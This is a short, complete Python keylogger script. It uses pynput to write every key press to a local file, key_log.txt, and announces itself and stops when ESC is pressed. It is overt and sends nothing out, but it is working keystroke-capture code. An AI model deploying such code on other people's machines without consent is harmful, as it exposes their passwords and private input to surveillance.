from pynput.keyboard import Key, Listener

# File to save logged keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as log:
            # Write the key to the file
            log.write(str(key).replace("'", ""))
            log.write(" ")  # Add a space between each keystroke for readability
    except Exception as e:
        print(f"Error: {e}")

# Setup key listener
def on_release(key):
    if key == Key.esc:  # Stop listener when ESC is pressed
        return False

# Main function to start logging
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()

